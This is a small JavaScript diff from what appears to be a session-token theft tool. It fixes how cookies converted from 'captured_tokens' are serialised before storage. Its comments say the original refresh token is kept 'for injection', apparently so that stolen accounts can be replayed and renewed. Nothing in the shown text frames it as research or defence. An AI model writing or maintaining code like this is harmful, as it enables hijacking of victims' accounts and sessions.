@@ -872,7 +872,7 @@ async function processCookieConversion(tokenId, accessToken, templateType, tenan
     // Don't overwrite the refresh token column - it must stay intact for injection
     await db.query(
       'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
-      [encrypt(result.cookies), 'cookie', accountType, ttlHours, tokenId]
+      [encrypt(JSON.stringify(result.cookies)), 'cookie', accountType, ttlHours, tokenId]
     );
     // Note: refresh_token_encrypted is intentionally NOT updated here
     // to preserve the original refresh token for injection fallback
